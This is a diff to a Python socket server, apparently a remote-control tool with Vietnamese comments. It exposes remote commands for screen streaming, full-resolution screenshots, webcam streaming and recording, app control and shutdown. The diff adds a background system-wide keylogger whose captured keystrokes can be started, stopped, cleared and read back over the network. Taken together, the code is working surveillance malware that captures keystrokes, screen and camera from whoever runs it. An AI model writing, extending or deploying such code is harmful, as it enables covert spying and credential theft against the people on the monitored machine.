@@ -10,27 +10,62 @@ import struct
 from PIL import ImageGrab
 import io
 import numpy as np
+from pynput import keyboard # <--- THƯ VIỆN MỚI ĐỂ KEYLOG
 
 HOST = "0.0.0.0"
 PORT = 5001
 
-# --- BIẾN TOÀN CỤC CHO CAMERA ---
+# --- BIẾN TOÀN CỤC CAMERA ---
 global_cap = None
 global_frame = None
 camera_lock = threading.Lock()
 is_camera_running = True
 
+# --- BIẾN TOÀN CỤC KEYLOGGER ---
+is_keylogging = False # Mặc định là TẮT để không ghi rác
+
+# ==========================================
+# PHẦN KEYLOGGER HỆ THỐNG (MỚI)
+# ==========================================
+def on_press(key):
+    global is_keylogging
+    # Nếu chưa bật chế độ ghi thì thoát luôn
+    if not is_keylogging:
+        return
+
+    try:
+        k = key.char
+    except AttributeError:
+        if key == keyboard.Key.space: k = " "
+        elif key == keyboard.Key.enter: k = "\n"
+        elif key == keyboard.Key.backspace: k = " [BS] "
+        else: k = f" [{str(key).replace('Key.', '')}] "
+
+    try:
+        with open("web_keylog.txt", "a") as f:
+            f.write(str(k))
+    except Exception as e:
+        print(f"Keylog Error: {e}")
+
+def start_keylogger():
+    # Listener luôn chạy ngầm, nhưng chỉ ghi khi biến is_keylogging = True
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+    print("[INFO] System Keylogger listener ready (Waiting for Start command).")
+
+# Kích hoạt Keylogger chạy ngầm
+start_keylogger()
+
+# ==========================================
+
 # --- HÀM CHẠY NGẦM: ĐỌC CAMERA LIÊN TỤC ---
 def camera_loop():
     global global_cap, global_frame
     
-    # 1. Mở camera (Thử index 0 hoặc 1 nếu dùng iPhone continuity)
-    # Tăng độ phân giải lên HD
+    # Mở camera (Thử index 0 hoặc 1 nếu dùng iPhone continuity)
     cap = cv2.VideoCapture(0)
     cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
     cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
-    
-    # Chỉnh FPS (nếu camera hỗ trợ)
     cap.set(cv2.CAP_PROP_FPS, 30)
 
     if not cap.isOpened():
@@ -51,9 +86,7 @@ def camera_loop():
     cap.release()
     print("[INFO] Global Camera stopped.")
 
-# Khởi động luồng camera ngay khi chạy server
 threading.Thread(target=camera_loop, daemon=True).start()
-
 
 # --- HÀM QUÉT APP ---
 def scan_installed_apps():
@@ -94,45 +127,28 @@ def stop_app(app_name):
     subprocess.run(["pkill", "-f", app_name], check=False)
     return f"[OK] Attempted to stop {app_name}"
 
-# --- HÀM CHỤP MÀN HÌNH STREAM ---
+# --- HÀM CHỤP MÀN HÌNH ---
 def capture_screen_bytes():
     try:
         img = ImageGrab.grab()
-        
-        # --- THÊM DÒNG NÀY ĐỂ SỬA LỖI ---
-        # Chuyển đổi từ RGBA (có độ trong suốt) sang RGB (chỉ màu sắc)
         img = img.convert("RGB") 
-        # -------------------------------
-
-        # Resize nhẹ để giảm lag mạng (nhưng vẫn giữ độ nét tương đối)
         img.thumbnail((1600, 900)) 
-        
         img_byte_arr = io.BytesIO()
-        # Tăng chất lượng JPEG lên 80
         img.save(img_byte_arr, format='JPEG', quality=80)
         return img_byte_arr.getvalue()
     except Exception as e:
         print(f"[ERROR] Screen capture: {e}")
         return None
 
-# --- HÀM LẤY ẢNH TỪ GLOBAL CAMERA ---
 def capture_webcam_bytes():
     with camera_lock:
-        if global_frame is None:
-            return None
-        # Copy frame để tránh conflict khi đang encode
+        if global_frame is None: return None
         frame_copy = global_frame.copy()
-    
     try:
-        # Nén JPEG với chất lượng cao (90)
-        # Gửi màu gốc (không bị trắng đen)
         _, buffer = cv2.imencode('.jpg', frame_copy, [int(cv2.IMWRITE_JPEG_QUALITY), 90])
         return buffer.tobytes()
-    except Exception as e:
-        print(f"[ERROR] Webcam encode: {e}")
-        return None
+    except Exception as e: return None
 
-# --- CÁC HÀM KHÁC ---
 def take_screenshot():
     try:
         os.makedirs("screenshots", exist_ok=True)
@@ -141,51 +157,35 @@ def take_screenshot():
         return f"[OK] Screenshot saved: {filename}"
     except Exception as e: return f"[ERROR] {e}"
 
-# --- HÀM MỚI: CHỤP ẢNH GỐC ĐỂ GỬI FILE (KHÔNG RESIZE) ---
 def capture_full_quality_bytes():
     try:
         img = ImageGrab.grab()
-        img = img.convert("RGB") # Sửa lỗi RGBA
-        
-        # Không resize (thumbnail) để giữ nguyên độ nét
+        img = img.convert("RGB")
         img_byte_arr = io.BytesIO()
-        
-        # Lưu chất lượng cao nhất (JPEG 100)
         img.save(img_byte_arr, format='JPEG', quality=100)
         return img_byte_arr.getvalue()
-    except Exception as e:
-        print(f"[ERROR] High-res capture: {e}")
-        return None
+    except Exception as e: return None
 
 def record_webcam(seconds):
     out = None
     try:
         os.makedirs("recordings", exist_ok=True)
         filename = f"recordings/webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
-        
-        # Lấy kích thước từ frame hiện tại (Global Camera)
         with camera_lock:
-            if global_frame is None: return None # Trả về None nếu lỗi
+            if global_frame is None: return None
             height, width, _ = global_frame.shape
-
         fourcc = cv2.VideoWriter_fourcc(*'avc1')
         out = cv2.VideoWriter(filename, fourcc, 30.0, (width, height))
-        
-        print(f"[INFO] Recording to {filename}...")
         start_time = time.time()
-        
         while (time.time() - start_time) < seconds:
             with camera_lock:
                 if global_frame is not None:
                     out.write(global_frame)
             time.sleep(0.033)
-
-        return filename # <--- TRẢ VỀ ĐƯỜNG DẪN FILE
-
+        return filename
     except Exception as e:
         print(f"[ERROR] Record failed: {e}")
         return None
-    
     finally:
         if out: out.release()
 
@@ -227,17 +227,33 @@ def handle_client(conn, addr):
         parts = data.split()
         command = parts[0].lower()
 
-        if command == "screen_stream":
+        if command == "keylog_start":
+            is_keylogging = True
+            conn.sendall(b"[OK] Keylogger Started")
+            return
+        elif command == "keylog_stop":
+            is_keylogging = False
+            conn.sendall(b"[OK] Keylogger Stopped")
+            return
+        elif command == "keylog_clear":
+            # Xóa sạch nội dung file log trên server
+            with open("web_keylog.txt", "w") as f:
+                f.write("")
+            conn.sendall(b"[OK] Server Logs Cleared")
+            return
+        
+        elif command == "disconnect":
+            print(f"Client {addr} disconnected.")
+            return # Đóng kết nối
+
+        elif command == "screen_stream":
             img_data = capture_screen_bytes()
             send_image_data(conn, img_data)
             return
-
         elif command == "download_screenshot":
-            # Lấy ảnh gốc chất lượng cao
             img_data = capture_full_quality_bytes()
             send_image_data(conn, img_data)
-            return # Gửi xong đóng kết nối luôn
-
+            return
         elif command == "webcam_stream":
             img_data = capture_webcam_bytes()
             send_image_data(conn, img_data)
@@ -256,35 +272,23 @@ def handle_client(conn, addr):
                 result = start_app(name) if command == "start" else stop_app(name)
         elif command == "webcam_record":
              if len(parts) < 2: 
-                 # Gửi size 0 báo lỗi nếu thiếu tham số
                  send_image_data(conn, None) 
                  return
-
-             # 1. Quay video và lấy đường dẫn file
              video_path = record_webcam(int(parts[1]))
-             
              if video_path and os.path.exists(video_path):
-                 # 2. Đọc file thành bytes
-                 with open(video_path, "rb") as f:
-                     video_data = f.read()
-                 
-                 # 3. Gửi file về client (Dùng chung hàm gửi ảnh vì cơ chế giống hệt)
+                 with open(video_path, "rb") as f: video_data = f.read()
                  send_image_data(conn, video_data)
-                 
-                 # 4. Xóa file trên server để tiết kiệm chỗ (Tùy chọn)
                  try: os.remove(video_path)
                  except: pass
-             else:
-                 # Gửi lỗi
-                 send_image_data(conn, None)
-             
-             return # Kết thúc kết nối sau khi gửi file
+             else: send_image_data(conn, None)
+             return
         elif command == "keylog_web":
+             # Lệnh này từ web gửi xuống (nếu cần log cả phím web)
              with open("web_keylog.txt", "a") as f: f.write((parts[1] if len(parts)>1 else "")+'\n')
              conn.sendall(b"OK"); return
         elif command == "keylog_data":
              try: 
-                 with open("web_keylog.txt") as f: result=f.read()
+                 with open("web_keylog.txt", "r") as f: result=f.read()
              except: result=""
              conn.sendall(result.encode()); return
         elif command == "shutdown": result = shutdown_machine()
